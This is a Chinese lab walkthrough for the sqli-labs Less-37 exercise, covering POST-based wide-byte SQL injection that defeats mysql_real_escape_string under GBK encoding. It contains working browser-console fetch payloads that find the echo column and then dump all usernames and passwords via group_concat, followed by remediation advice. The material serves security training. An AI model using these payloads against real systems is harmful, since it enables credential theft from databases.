## 一、靶场信息
- **漏洞类型**：宽字节注入（Wide Byte Injection），POST 型传参。
- **防御机制**：后台使用了 `mysql_real_escape_string()` 函数对输入的用户名和密码进行严格转义，并且页面底部会打印出转义后的结果。
- **通关思路**：利用数据库的 GBK 编码特性，在用户名中传入 `%df` 与转义生成的反斜杠 `%5c` 结合形成汉字，吃掉反斜杠让单引号逃逸；由于参数是 POST 传参且常规抓包工具操作受限，直接使用浏览器 F12 控制台（Console）通过 `fetch` 发送恶意请求。

## 二、核心绕过思路（大白话解析）

这关的防御核心依然是 `mysql_real_escape_string`。很多人看到页面底部直接把转义后的十六进制结果展示出来，就觉得这关坚不可摧了。但这依然是个“纸老虎”。

只要数据库连接字符集是 GBK，底层的逻辑就存在致命缺陷：你输入 `%df'`，后台强行在前面加个反斜杠 `\`，变成了 `%df%5c%27`。MySQL 数据库一解析，把 `%df%5c` 当成了一个繁体汉字（比如“運”），反斜杠就这么被“吃”掉了，最后的单引号 `%27` 成功逃逸出来闭合了 SQL 语句。

**注意：** 这关是 POST 传参，直接在 URL 里敲 payload 没用。并且某些浏览器的网络面板“编辑并重放”功能受限，为了最高效地通关，我们可以直接按 `F12` 打开**控制台（Console）**，用 JavaScript 的 `fetch` 函数直接构造 POST 请求进行注入。

## 三、详细操作步骤与 Payload 解析

### 第一步：控制台探测回显点

**操作方式：**
打开 Less-37 靶场页面，按 `F12` 打开开发者工具，切换到 **Console（控制台）**，粘贴以下代码并回车：

```javascript
fetch('', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'uname=-1%df%27%20union%20select%201,2%20--+&passwd=1&submit=Submit'
})
.then(res => res.text())
.then(data => {
  let match = data.match(/Your Login name:(.*?)<br>/);
  console.log(match ? "回显位：" + match[1].trim() : "未找到回显，请检查 Payload");
});
```

**回显现象：**
控制台打印出 `回显位：1`。（注：此处回显为 1 而非 2，是因为后端 PHP 代码在提取数据时，只提取并打印了第一列的值，但能回显 1 就说明联合查询已经成功执行）。

**大白话解析：**
*   **`fetch('', {...})`**：向当前页面发送一个 POST 请求。代码中的空格被 URL 编码为 `%20`，单引号被编码为 `%27`，防止在传输过程中被浏览器或环境二次处理。
*   **`uname=-1%df%27...`**：`-1` 让原查询落空，`%df` 吃掉转义的反斜杠，`%27` 逃逸闭合语法。
*   **`match(/Your Login name:(.*?)<br>/)`**：利用正则表达式精准抓取页面中 "Your Login name:" 后面的回显内容并打印到控制台，省去了我们去页面里找的麻烦。

### 第二步：终极脱库（提取账号密码）

既然第 1 列可以回显，我们直接把 `group_concat` 函数塞到第 1 列。在控制台粘贴以下代码并回车：

```javascript
fetch('', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'uname=-1%df%27%20union%20select%20group_concat(username,0x3a,password),2%20from%20users%20--+&passwd=1&submit=Submit'
})
.then(res => res.text())
.then(data => {
  let match = data.match(/Your Login name:(.*?)<br>/);
  console.log(match ? "脱库成功，数据为：" + match[1].trim() : "未找到回显");
});
```

**回显现象：**
控制台直接打印出：`脱库成功，数据为：Dumb:Dumb,Angelina:I-kill-you...` 等全部账号密码。

**大白话解析：**
*   **`group_concat(username,0x3a,password)`**：超级打包机，把 `users` 表里的账号和密码全部拼接起来，用冒号（`0x3a`）隔开。
*   把它放在第一列，借助宽字节注入，一次性全部打印在控制台中。

## 四、核心防御机制（Remediation）
- **统一字符集**：将数据库和 Web 应用的字符集统一设置为 `UTF-8`，彻底杜绝宽字节注入。
- **预编译语句（PDO/MySQLi）**：使用参数化查询，从根本上隔离代码与数据。
- **GET与POST同等防护**：不要以为将参数从 GET 改成 POST 或者使用了严格的转义函数就安全了，只要数据被直接拼接到 SQL 语句中且字符集不匹配，漏洞就依然存在。
